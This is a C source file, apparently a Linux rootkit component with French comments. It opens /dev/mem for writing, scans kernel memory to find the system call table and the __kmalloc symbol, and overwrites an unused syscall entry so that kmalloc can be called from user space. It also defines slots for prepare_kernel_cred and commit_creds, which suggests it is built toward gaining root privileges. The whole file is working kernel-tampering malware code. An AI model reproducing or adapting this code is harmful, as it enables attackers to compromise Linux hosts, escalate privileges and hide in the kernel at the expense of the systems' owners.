#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h> /* peut etre genant */
#include <sys/types.h>
#include <unistd.h>

#include "manipmem.h"

/*
  syscall use :
     - open
     - close
     - read
     - write
     - lseek  
     (en gros)
 strace ./rootkit &> test
 grep -v -E open\|close\|read\|write\|lseek test
*/


#define MODULE "/dev/mem"

#define OFFSET 0xc0000000

/* syscall number not implemented or reserved */
#define __NR_prepare_kernel_cred 0xbc
#define __NR_commit_creds        0xbd
#define __NR_kmalloc             0xa9

#ifndef __NR_close
#define __NR_close               0x06
#endif

#ifndef __NR_restart_syscall
#define __NR_restart_syscall     0x00
#endif

#define SYS_CLOSE                0xc0138a50 /* need adapt*/
#define SYS_RESTART_SYSCALL      0xc0032790 /* need adapt*/  


#define KM_STR      "__kmalloc"
#define RESTART_STR "sys_restart_syscall"
#define CLOSE_STR   "sys_close"
#define WRITE_STR   "sys_write"

#define MAX(a, b)				\
  (a > b ? a : b)

typedef struct buff_mem_t {
  char* mem;
  ulong size;
} buff_mem;


static int
cond_int (char *buff, void *integer)
{
  u_int32_t val = (u_int32_t) integer;
  u_int32_t *buffer = (u_int32_t*) buff;
  return (*buffer) == val;
}

static int
cond_mem (char *buff, void *param)
{
  buff_mem bm = *(buff_mem*) param;
  return !(memcmp(buff, &bm.mem, bm.size));
}


#define FOR_THE_KIDS
#ifdef FOR_THE_KIDS
static int
sct_sys(char *buff, void *param)
{
  u_int32_t *buffer = (u_int32_t*) buff; 
  return (*(buffer + __NR_close)) == SYS_CLOSE &&
    (*(buffer + __NR_restart_syscall)) == SYS_RESTART_SYSCALL;
}

static u_int32_t
find_sct(int fd)
{
  condition c_sct;
  c_sct.cond = sct_sys;
  c_sct.marge = MAX(__NR_restart_syscall, __NR_close);
  c_sct.param = NULL;
  return scan_mem(fd, 0, c_sct, 1, 0, LIMIT);
}

#endif

static u_int32_t
read_addr(int fd, u_int32_t addr)
{
  char buff[P_SIZE];
  if (get_page(fd, buff, addr) < (addr & 0x00000fff))
    return 0;
  return *((u_int32_t *) &buff[addr & 0x00000fff]);
}

static int
cond_str (char *buff, void *param)
{
  char *str = (char*) param;
  return !(memcmp(buff, str, strlen(str + 1) + 2));
}

static char *
make_str(char *str, ulong *len)
{
  char *new = malloc(sizeof(char) * (strlen(str) + 2));
  if (new == NULL)
    return NULL;
  *len = strlen(str) + 2;
  new[0] = '\0';
  memcpy(new + 1, str, strlen(str));  
  new[*len] = '\0';
  return new;
}

static u_int32_t
find_fun_str(int fd, char *str)
{
  condition c_str;
  c_str.cond = cond_str;
  c_str.param = make_str(str, &c_str.marge);
  if (c_str.param == NULL)
    return 0;
  u_int32_t addr = scan_mem(fd, 0, c_str, 1, 1, LIMIT);
  free(c_str.param);
  if (addr == 0)
    return 0;
  addr++;
  fprintf (stdout, "\t[*] %s : kstrtab trouve a %08x\n", str, addr + OFFSET);
 
  condition c_addr;
  c_addr.cond = cond_int;
  c_addr.marge = sizeof (u_int32_t);
  c_addr.param = (void*) (addr + OFFSET);
  addr = find_lower_near(fd, addr, c_addr, 0);
  if (!addr)
    return 0;
  addr -= 4;
  fprintf (stdout, "\t[*] %s : ksymtab trouve a %08x\n", str, addr + OFFSET);
  return read_addr(fd, addr);
}

static int
add_syscall(int fd, u_int32_t sct, u_int32_t syscall, int num)
{
  return write_mem(fd, sct + num * sizeof(u_int32_t), &syscall, sizeof(u_int32_t));
}

int
main(int argc, char **argv)
{

  fprintf(stdout, "[+] Ouverture de %s\n", MODULE);
  int module = open(MODULE, O_RDWR);
  if (module < 0)
  {
    fprintf (stderr, "\t[-] Impossible d'ouvrir le module %s\n", MODULE);
    return EXIT_FAILURE;
  }

  fprintf(stdout, "[+] Recuperation de la table des appels sytemes\n");
  u_int32_t syscall_table = find_sct(module);
  if (!syscall_table)
  {
    fprintf(stderr, "\t[-] Table des appels systemes non trouve\n");
    goto fin;
  }
  fprintf(stdout,
	  "[+] Table des appels systemes trouve a : %08x\n",
	  syscall_table + OFFSET);
  
  fprintf(stdout, "[+] Recherche de kmalloc par str...\n");

  u_int32_t km_addr = find_fun_str(module, KM_STR);
  if (km_addr != 0)
    fprintf (stdout, "[+] %s trouve a : %08x\n", KM_STR, km_addr);
  else
  {
    fprintf(stderr,"\t[-] Erreur %s non trouve\n", KM_STR);
    goto fin;
  }

  fprintf(stdout,
	  "[+] Creation de l'appel system kmalloc a : %d\n", __NR_kmalloc);
  if (add_syscall(module, syscall_table, km_addr, __NR_kmalloc) < 0)
  {
    fprintf(stderr, "\t[-] Echec de la creation\n");
    goto fin;
  }
  else
    fprintf(stdout, "[+] Creation reussi, appel %d : %08x\n",
	  __NR_kmalloc, read_addr(module, syscall_table + __NR_kmalloc * 4));
fin:
  close(module);  
  return EXIT_SUCCESS;
}
